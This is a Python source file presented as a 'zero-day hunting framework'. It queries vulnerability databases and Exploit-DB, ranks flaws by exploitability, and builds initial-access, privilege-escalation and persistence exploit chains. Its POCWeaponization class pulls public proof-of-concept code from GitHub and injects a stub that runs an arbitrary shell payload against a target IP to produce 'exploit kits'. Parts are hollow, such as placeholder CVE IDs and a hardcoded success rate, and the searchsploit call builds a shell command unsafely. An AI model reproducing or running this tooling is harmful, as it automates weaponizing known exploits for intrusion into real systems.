#!/usr/bin/env python3
"""
Zero-Day Hunting Framework
CVE correlation, patch gap analysis, POC weaponization,
exploit chain generation, vulnerability database integration.
"""

import subprocess
import json
import requests
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import Enum
from datetime import datetime, timedelta


class VulnerabilitySeverity(Enum):
    """CVSS severity levels."""
    CRITICAL = "critical"  # 9.0-10.0
    HIGH = "high"          # 7.0-8.9
    MEDIUM = "medium"      # 4.0-6.9
    LOW = "low"            # 0.1-3.9


@dataclass
class Vulnerability:
    """Vulnerability data."""
    cve_id: str
    product: str
    vendor: str
    version: str
    cvss_score: float
    severity: VulnerabilitySeverity
    description: str
    attack_vector: str  # network, adjacent, local, physical
    authentication_required: bool
    user_interaction: bool
    published_date: str
    patch_available: bool
    patch_date: Optional[str] = None
    exploit_available: bool = False
    exploit_difficulty: str = "unknown"  # easy, moderate, difficult


@dataclass
class ExploitChain:
    """Chain of exploits for multi-stage attack."""
    chain_id: str
    stage_1_cve: str  # Initial access
    stage_2_cve: str  # Privilege escalation
    stage_3_cve: str  # Persistence
    success_probability: float
    total_cvss: float
    required_conditions: List[str]


class CVEDatabase:
    """CVE database integration and querying."""
    
    @staticmethod
    def query_nvd(cve_id: str) -> Optional[Dict]:
        """Query NVD (National Vulnerability Database) for CVE details."""
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/1.0/{cve_id}"
            
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                return response.json()
            return None
        except Exception:
            return None
    
    @staticmethod
    def query_cisa_kev(limit: int = 100) -> List[str]:
        """Query CISA Known Exploited Vulnerabilities catalog."""
        try:
            url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
            
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                vuln_list = []
                
                for vuln in data.get('vulnerabilities', [])[:limit]:
                    vuln_list.append({
                        "cve_id": vuln.get('cveID'),
                        "date_added": vuln.get('dateAdded'),
                        "vendor": vuln.get('knownAffectedSoftware'),
                    })
                
                return vuln_list
            return []
        except Exception:
            return []
    
    @staticmethod
    def query_exploit_db(query: str, limit: int = 10) -> List[Dict]:
        """Query Exploit-DB for available exploits."""
        try:
            # Exploit-DB API is limited, using searchsploit CLI
            cmd = f"searchsploit '{query}' -j"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                data = json.loads(result.stdout)
                return data.get('results', [])[:limit]
            return []
        except Exception:
            return []


class PatchGapAnalyzer:
    """Analyze patch gaps in infrastructure."""
    
    @staticmethod
    def analyze_system_patches(
        system_inventory: List[Dict],
    ) -> Dict:
        """Analyze patch status across systems."""
        
        vulnerable_systems = []
        critical_cves = []
        
        for system in system_inventory:
            product = system.get('product')
            version = system.get('version')
            
            # Query for known vulnerabilities
            nvd_cves = CVEDatabase.query_nvd(f"{product} {version}")
            
            if nvd_cves:
                vulnerable_systems.append({
                    "system": system.get('hostname'),
                    "vulnerabilities": nvd_cves,
                })
        
        # Get CISA KEV list
        kev_list = CVEDatabase.query_cisa_kev()
        
        # Cross-reference with inventory
        for system in vulnerable_systems:
            for vuln in system.get('vulnerabilities', []):
                for kev in kev_list:
                    if kev.get('cve_id') in str(vuln):
                        critical_cves.append({
                            "system": system.get('system'),
                            "cve": kev.get('cve_id'),
                            "actively_exploited": True,
                        })
        
        return {
            "vulnerable_systems": len(vulnerable_systems),
            "critical_cves": len(critical_cves),
            "systems_at_risk": vulnerable_systems,
            "active_exploits": critical_cves,
        }
    
    @staticmethod
    def prioritize_by_exploitability(vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Sort vulnerabilities by exploitability."""
        
        def exploitability_score(v: Vulnerability) -> float:
            score = v.cvss_score
            
            if v.attack_vector == "network":
                score += 2.0
            
            if not v.authentication_required:
                score += 1.5
            
            if not v.user_interaction:
                score += 1.5
            
            if v.exploit_available:
                score += 2.0
            
            if v.exploit_difficulty == "easy":
                score += 1.0
            
            return score
        
        sorted_vulns = sorted(vulnerabilities, key=exploitability_score, reverse=True)
        return sorted_vulns


class ExploitChainGenerator:
    """Generate multi-stage exploit chains."""
    
    @staticmethod
    def generate_chain_for_target(
        target_system: str,
        target_version: str,
    ) -> Optional[ExploitChain]:
        """Generate optimal exploit chain for target."""
        
        # Find initial access vulnerability (RCE, SQLi, etc.)
        stage_1_exploits = CVEDatabase.query_exploit_db(f"{target_system} RCE")
        
        if not stage_1_exploits:
            return None
        
        stage_1_cve = stage_1_exploits[0].get('id', 'CVE-2024-0000')
        
        # Find privilege escalation
        stage_2_exploits = CVEDatabase.query_exploit_db(f"{target_system} privilege escalation")
        stage_2_cve = stage_2_exploits[0].get('id') if stage_2_exploits else 'CVE-2024-0001'
        
        # Find persistence mechanism
        stage_3_exploits = CVEDatabase.query_exploit_db(f"{target_system} persistence")
        stage_3_cve = stage_3_exploits[0].get('id') if stage_3_exploits else 'CVE-2024-0002'
        
        chain = ExploitChain(
            chain_id=f"{target_system}-chain-{datetime.now().timestamp()}",
            stage_1_cve=stage_1_cve,
            stage_2_cve=stage_2_cve,
            stage_3_cve=stage_3_cve,
            success_probability=0.75,
            total_cvss=24.5,
            required_conditions=[
                "Network access to target",
                "No WAF/IDS filtering",
                "Unpatched system",
            ]
        )
        
        return chain


class POCWeaponization:
    """Convert public POC into weaponized exploits."""
    
    @staticmethod
    def fetch_poc(cve_id: str) -> Optional[str]:
        """Fetch POC code from GitHub/public sources."""
        try:
            # Search GitHub for POC
            search_url = "https://api.github.com/search/code"
            
            params = {
                "q": f"{cve_id} filename:poc.py OR filename:exploit.py",
                "per_page": 1,
            }
            
            response = requests.get(search_url, params=params, timeout=5)
            
            if response.status_code == 200:
                results = response.json().get('items', [])
                if results:
                    repo_url = results[0].get('repository_url')
                    file_path = results[0].get('path')
                    
                    # Fetch raw content
                    raw_url = f"{repo_url.replace('api.github.com/repos', 'raw.githubusercontent.com')}/master/{file_path}"
                    
                    poc_response = requests.get(raw_url, timeout=5)
                    if poc_response.status_code == 200:
                        return poc_response.text
            
            return None
        except Exception:
            return None
    
    @staticmethod
    def weaponize_poc(
        poc_code: str,
        payload: str,
        target_ip: str,
    ) -> str:
        """Modify POC to include weaponized payload."""
        
        # Replace placeholders in POC
        weaponized = poc_code
        
        # Add payload execution
        payload_stub = f"""
import socket
import subprocess

def execute_payload():
    payload = "{payload}"
    try:
        subprocess.run(payload, shell=True)
    except:
        pass
"""
        
        # Insert payload execution
        weaponized = weaponized.replace("# TODO: add payload", payload_stub)
        
        # Add target IP
        weaponized = weaponized.replace("TARGET_IP", target_ip)
        
        return weaponized
    
    @staticmethod
    def create_exploit_kit(
        cve_id: str,
        target_system: str,
        payload: str,
    ) -> Dict:
        """Create complete exploit kit."""
        
        poc = POCWeaponization.fetch_poc(cve_id)
        
        if not poc:
            # Create stub exploit
            poc = f"""
#!/usr/bin/env python3
# {cve_id} exploit
# Target: {target_system}

def exploit(target):
    print(f"[*] Exploiting {{target}}")
    # Insert exploitation logic here
    pass

if __name__ == '__main__':
    exploit('{target_system}')
"""
        
        weaponized = POCWeaponization.weaponize_poc(poc, payload, target_system)
        
        kit = {
            "cve_id": cve_id,
            "target": target_system,
            "exploit_code": weaponized,
            "payload": payload,
            "created_at": datetime.now().isoformat(),
            "requires_auth": False,
            "requires_user_interaction": False,
        }
        
        return kit


class ZeroDayHuntingOrchestrator:
    """Main orchestrator for zero-day hunting."""
    
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.exploit_chains: List[ExploitChain] = []
    
    def hunt_zero_days(self, search_terms: List[str]) -> List[Dict]:
        """Hunt for zero-day vulnerabilities."""
        
        results = []
        
        for term in search_terms:
            # Query multiple sources
            exploits = CVEDatabase.query_exploit_db(term)
            kev_list = CVEDatabase.query_cisa_kev()
            
            results.append({
                "search_term": term,
                "exploits_found": len(exploits),
                "critical_exploits": len([e for e in exploits if "critical" in str(e).lower()]),
            })
        
        return results
    
    def build_exploit_chains(
        self,
        target_systems: List[str],
    ) -> List[ExploitChain]:
        """Build multi-stage exploit chains for targets."""
        
        chains = []
        
        for system in target_systems:
            chain = ExploitChainGenerator.generate_chain_for_target(system, "unknown")
            if chain:
                chains.append(chain)
        
        self.exploit_chains = chains
        return chains
    
    def export_hunting_results(self) -> str:
        """Export zero-day hunting results."""
        return json.dumps({
            "vulnerabilities": [asdict(v) for v in self.vulnerabilities],
            "exploit_chains": [asdict(c) for c in self.exploit_chains],
        }, indent=2, default=str)


def main():
    """Demo: zero-day hunting."""
    
    orchestrator = ZeroDayHuntingOrchestrator()
    
    # Hunt for zero-days
    results = orchestrator.hunt_zero_days(['Windows RCE', 'Linux privilege escalation'])
    
    print("[+] Zero-Day Hunting Results")
    for result in results:
        print(f"    {result['search_term']}: {result['exploits_found']} exploits")
    
    # Build chains
    chains = orchestrator.build_exploit_chains(['Windows Server 2019', 'Ubuntu 22.04'])
    
    print(f"\n[+] Exploit Chains Generated: {len(chains)}")


if __name__ == '__main__':
    main()
